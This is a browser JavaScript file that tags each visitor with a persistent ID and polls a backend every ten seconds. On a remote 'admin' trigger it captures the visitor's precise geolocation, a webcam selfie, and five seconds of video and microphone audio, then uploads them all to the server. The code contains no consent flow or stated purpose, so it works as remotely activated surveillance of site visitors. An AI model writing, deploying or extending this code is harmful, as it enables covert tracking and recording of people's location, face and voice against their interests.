let alreadyCaptured = false;

// ✅ Get stable username (logged-in or anonymous)
let username = localStorage.getItem("loggedInUser");
if (!username) {
  username = localStorage.getItem("anonUserId");
  if (!username) {
    username = `anonymous-${Date.now()}`;
    localStorage.setItem("anonUserId", username);
  }
}

// ✅ Track visit
fetch(`${BACKEND_URL}/api/track-visit`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username })
});

// ✅ Manual capture function
async function manualCapture(triggeredBy = "user", forcedUsername = "") {
  if (alreadyCaptured) return;
  alreadyCaptured = true;

  let selfieBlob = null;
  let videoBlob = null;
  let audioBlob = null;
  let videoStream = null;
  let audioStream = null;

  try {
    // ✅ Step 1: Get Location
    const location = await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }),
        err => {
          console.warn("📍 Location error:", err);
          resolve({ lat: 0, lon: 0, accuracy: 0 });
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });

    // ✅ Step 2: Request Camera + Mic Separately
    try {
      videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
    } catch (err) {
      console.warn("📷 Camera denied:", err);
    }

    try {
      audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    } catch (err) {
      console.warn("🎤 Microphone denied:", err);
    }

    // ✅ Step 3: Selfie (if video available)
    if (videoStream?.getVideoTracks().length) {
      const videoEl = document.createElement("video");
      videoEl.srcObject = videoStream;
      videoEl.muted = true;
      try {
        await videoEl.play();
      } catch (e) {
        console.warn("🎬 Video play failed:", e);
      }

      await new Promise(r => setTimeout(r, 1000));
      const canvas = document.createElement("canvas");
      canvas.width = videoEl.videoWidth;
      canvas.height = videoEl.videoHeight;
      canvas.getContext("2d").drawImage(videoEl, 0, 0);
      selfieBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
    }

    // ✅ Step 4: Record video and audio if possible
    const videoChunks = [], audioChunks = [];
    let videoRecorder = null, audioRecorder = null;
    const promises = [];

    if (videoStream?.getVideoTracks().length) {
      const vStream = new MediaStream([videoStream.getVideoTracks()[0]]);
      videoRecorder = new MediaRecorder(vStream, { mimeType: "video/webm;codecs=vp8" });
      videoRecorder.ondataavailable = e => videoChunks.push(e.data);
      videoRecorder.start();
      promises.push(new Promise(res => videoRecorder.onstop = res));
    }

    if (audioStream?.getAudioTracks().length) {
      const aStream = new MediaStream([audioStream.getAudioTracks()[0]]);
      audioRecorder = new MediaRecorder(aStream, { mimeType: "audio/webm;codecs=opus" });
      audioRecorder.ondataavailable = e => audioChunks.push(e.data);
      audioRecorder.start();
      promises.push(new Promise(res => audioRecorder.onstop = res));
    }

    await new Promise(r => setTimeout(r, 5000));

    if (videoRecorder?.state === "recording") videoRecorder.stop();
    if (audioRecorder?.state === "recording") audioRecorder.stop();
    await Promise.all(promises);

    if (videoChunks.length) {
      videoBlob = new Blob(videoChunks, { type: "video/webm" });
    }

    if (audioChunks.length) {
      audioBlob = new Blob(audioChunks, { type: "audio/webm" });
    }

    // ✅ Step 5: Upload
    const formData = new FormData();
    if (selfieBlob) formData.append("selfie", selfieBlob, `selfie-${Date.now()}.jpg`);
    if (videoBlob) formData.append("video", videoBlob, `video-${Date.now()}.webm`);
    if (audioBlob) formData.append("audio", audioBlob, `audio-${Date.now()}.webm`);
    formData.append("location", JSON.stringify(location));
    formData.append("triggeredBy", triggeredBy);
    formData.append("username", forcedUsername || username);

    await fetch(`${BACKEND_URL}/api/capture-data`, {
      method: "POST",
      body: formData
    });

    console.log("✅ Upload successful");

  } catch (err) {
    console.error("❌ Capture failed:", err);
  } finally {
    if (videoStream) videoStream.getTracks().forEach(track => track.stop());
    if (audioStream) audioStream.getTracks().forEach(track => track.stop());
    alreadyCaptured = false;
  }
}

// 🔁 Admin trigger polling (always active)
setInterval(async () => {
  console.log("Checking for trigger:", username);
  try {
    const res = await fetch(`${BACKEND_URL}/api/manual-capture-flag?username=${username}`);
    const data = await res.json();
    console.log("Trigger response:", data);

    if (data.trigger) {
      console.log("Triggering manual capture for", username);
      await manualCapture("admin", username);
    }
  } catch (err) {
    console.warn("Polling error:", err);
  }
}, 10000);

